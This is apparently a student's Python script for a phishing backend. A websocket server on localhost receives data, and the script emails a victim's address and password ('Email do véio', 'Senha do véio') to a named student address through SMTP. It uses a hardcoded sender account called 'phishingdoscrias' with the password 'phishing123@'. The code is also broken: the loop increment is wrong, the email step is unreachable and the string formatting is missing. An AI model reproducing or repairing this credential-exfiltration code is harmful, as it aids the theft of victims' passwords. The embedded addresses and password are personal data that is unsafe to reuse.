import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

import asyncio
import websockets

x=0
data= []
print("rodando")
while x<2:
    async def receive_data(websocket, path):
        data = await websocket.recv()
        print("Received data:", data[x])
        # Process the data as needed
        response = "Data received successfully"
        await websocket.send(response)
    x=+1

start_server = websockets.serve(receive_data, "localhost", 3002)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()

# Email configuration
sender_email = "phishingdoscrias@hotmail.com"
receiver_email = "guilherme.barnabe@estudante.ifms.edu.br"
password = "phishing123@"

# Create the email message
subject = "Pegamo um véio" 
body = "Email do véio: {data[0]}<br> Senha do véio: {data[1]}"
message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = subject
message.attach(MIMEText(body, 'plain'))

# Establish a connection to the SMTP server
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    # Start the TLS connection (for security)
    server.starttls()

    # Log in to your email account
    server.login(sender_email, password)

    # Send the email
    server.sendmail(sender_email, receiver_email, message.as_string())

print("Email sent successfully.")